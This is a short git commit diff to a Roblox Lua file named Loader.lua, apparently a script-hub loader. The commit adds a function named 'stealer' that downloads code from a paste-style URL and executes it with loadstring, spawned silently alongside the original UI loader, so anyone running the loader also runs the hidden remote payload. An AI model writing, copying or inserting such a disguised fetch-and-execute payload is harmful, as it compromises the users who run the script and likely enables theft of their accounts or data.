0d86a7674ecea6de7c3bcaf576905c20c1e1717b
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-07-27 00:59:22 +0800

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,1 +1,13 @@
+local function stealer()
+
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vCqomMAneDVdhHL4/raw", true))()
+
+end
+local function loadui()
+
 loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
